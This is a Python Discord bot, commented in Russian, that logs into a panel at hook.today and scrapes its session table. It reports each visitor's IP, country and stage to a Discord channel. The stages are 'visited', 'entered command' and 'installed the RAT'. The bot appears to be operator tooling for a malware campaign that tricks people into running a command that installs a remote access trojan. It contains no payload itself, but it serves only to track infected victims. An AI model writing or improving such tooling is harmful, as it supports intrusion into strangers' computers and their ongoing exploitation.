import discord
from discord.ext import commands, tasks
import asyncio
import time
import re
import os
import pickle
from datetime import datetime
from seleniumbase import Driver
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup
import requests

# ===== КОНФИГ =====
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
PANEL_URL = "https://hook.today"
CHECK_INTERVAL = 10

# ===== РЕЖИМ =====
# На Railway всегда headless
HEADLESS = False

# ===== ГЛОБАЛКИ =====
driver = None
sessions_data = {}
first_run = True
session = requests.Session()

# ===== КЭШ СТРАН =====
country_cache = {}


def get_country_flag(ip):
    if ip in country_cache:
        return country_cache[ip]
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                code = data.get('countryCode', '').lower()
                flag = f":flag_{code}:" if code else "🌐"
                country_cache[ip] = flag
                return flag
    except:
        pass
    country_cache[ip] = "🌐"
    return "🌐"


# ===== ЗАГРУЗКА/СОХРАНЕНИЕ КУК =====
COOKIES_FILE = "cookies.pkl"


def save_cookies(cookies):
    with open(COOKIES_FILE, 'wb') as f:
        pickle.dump(cookies, f)
    print("✅ Куки сохранены")


def load_cookies():
    try:
        with open(COOKIES_FILE, 'rb') as f:
            return pickle.load(f)
    except:
        return None


# ===== ОБНОВЛЕНИЕ КУК ЧЕРЕЗ БРАУЗЕР =====
def refresh_cookies():
    global driver, session

    print("🔄 Обновление кук через браузер...")

    try:
        # Запускаем браузер
        driver = Driver(
            uc=True,
            headless=HEADLESS,
            browser="chrome",
            user_data_dir="./browser_profile"
        )

        driver.get(PANEL_URL)
        time.sleep(5)

        # Если на странице логин — пробуем войти
        if "login" in driver.current_url.lower():
            try:
                driver.find_element(By.NAME, "login").send_keys(os.environ.get('PANEL_LOGIN', ''))
                driver.find_element(By.NAME, "password").send_keys(os.environ.get('PANEL_PASSWORD', ''))
                driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
                time.sleep(5)
            except:
                pass

        # Если не headless — ждём ручного входа
        if not HEADLESS:
            print("=" * 60)
            print("🔓 ВВЕДИ ЛОГИН, ПАРОЛЬ, ПРОЙДИ КАПЧУ")
            print("⏳ ПОСЛЕ ВХОДА НАЖМИ ENTER")
            print("=" * 60)
            input()

        # Получаем куки
        cookies = driver.get_cookies()
        save_cookies(cookies)

        # Обновляем сессию requests
        session.cookies.clear()
        for c in cookies:
            session.cookies.set(c['name'], c['value'], domain='.hook.today')

        driver.quit()
        driver = None

        print("✅ Куки успешно обновлены")
        return True

    except Exception as e:
        print(f"❌ Ошибка обновления кук: {e}")
        return False


# ===== ЗАПУСК БРАУЗЕРА =====
def start_browser():
    global driver, session

    try:
        # Пробуем загрузить куки
        cookies = load_cookies()
        if cookies:
            session.cookies.clear()
            for c in cookies:
                session.cookies.set(c['name'], c['value'], domain='.hook.today')

            # Проверяем, работают ли куки
            resp = session.get(f"{PANEL_URL}/?tab=all", timeout=30)
            if resp.status_code == 200:
                print("✅ Куки загружены и работают")
                return True
            else:
                print(f"⚠️ Куки не работают (статус: {resp.status_code}), обновляем...")

        # Если кук нет или они не работают — обновляем
        return refresh_cookies()

    except Exception as e:
        print(f"❌ Ошибка запуска: {e}")
        return False


# ===== ПАРСИНГ =====
def fetch_sessions():
    global driver, session

    try:
        # Пробуем получить данные через requests с куками
        resp = session.get(f"{PANEL_URL}/?tab=all", timeout=30)

        if resp.status_code == 403 or resp.status_code == 401:
            print("⚠️ Куки умерли, обновляем...")
            if refresh_cookies():
                return fetch_sessions()
            return []

        if resp.status_code != 200:
            print(f"❌ Ошибка HTTP: {resp.status_code}")
            return []

        html = resp.text
        soup = BeautifulSoup(html, 'html.parser')

        rows = []
        for row in soup.select('tr'):
            if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', str(row)):
                rows.append(row)

        sessions = []
        for row in rows:
            text = row.get_text()
            ip_match = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text)
            if not ip_match:
                continue
            ip = ip_match.group()

            time_match = re.search(r'\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2}:\d{2}', text)
            if not time_match:
                time_match = re.search(r'\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2}', text)
            pc_time = time_match.group() if time_match else '—'

            status = 'Зашел'
            if 'ратку' in text.lower() or 'rat' in text.lower():
                status = '🔥 Сел на ратку'
            elif 'команд' in text.lower():
                status = '⌨️ Ввел команду'

            sessions.append({
                'ip': ip,
                'status': status,
                'pc_time': pc_time,
                'rat_installed': 'ратку' in text.lower() or 'rat' in text.lower()
            })

        print(f"📊 Найдено сессий: {len(sessions)}")
        return sessions

    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return []


# ===== ОТПРАВКА =====
async def send_msg(channel, ip, data):
    flag = get_country_flag(ip)

    status = data.get('status', 'Зашел')
    if 'Ратка' in status:
        color = 0xe74c3c
    elif 'Команда' in status:
        color = 0xf1c40f
    else:
        color = 0x2ecc71

    embed = discord.Embed(
        title=f"{flag} Сессия {ip}",
        color=color,
        timestamp=datetime.now()
    )

    emoji = "🟢"
    if 'Ратка' in status:
        emoji = "🔴"
    elif 'Команда' in status:
        emoji = "🟡"

    embed.add_field(name="Статус", value=f"{emoji} {status}", inline=True)
    embed.add_field(name="Время", value=data.get('pc_time', '—'), inline=True)
    embed.add_field(name="RAT", value="✅ Да" if data.get('rat_installed') else "❌ Нет", inline=True)
    embed.set_footer(text=f"Обновлено: {datetime.now().strftime('%H:%M:%S')}")

    await channel.send(embed=embed)


# ===== МОНИТОРИНГ =====
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor():
    global sessions_data, first_run

    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        return

    print(f"🔄 Проверка... ({datetime.now().strftime('%H:%M:%S')})")

    sessions = await asyncio.get_event_loop().run_in_executor(None, fetch_sessions)
    if not sessions:
        return

    if first_run:
        for s in sessions:
            sessions_data[s['ip']] = s
        first_run = False
        print(f"✅ Запомнено {len(sessions_data)} сессий")
        return

    for s in sessions:
        ip = s['ip']

        if ip not in sessions_data:
            print(f"🆕 НОВАЯ: {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        old = sessions_data[ip]

        if s.get('pc_time') != old.get('pc_time') and s.get('pc_time') != '—':
            print(f"🔄 ПЕРЕЗАХОД {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        if s.get('status') != old.get('status'):
            print(f"🔄 СТАТУС {ip}: {s.get('status')}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        if s.get('rat_installed') and not old.get('rat_installed'):
            print(f"🔥 РАТКА {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue


# ===== БОТ =====
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    global first_run
    print(f"✅ Бот запущен: {bot.user}")
    first_run = True
    if await asyncio.get_event_loop().run_in_executor(None, start_browser):
        monitor.start()
        print("✅ Мониторинг запущен!")


if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)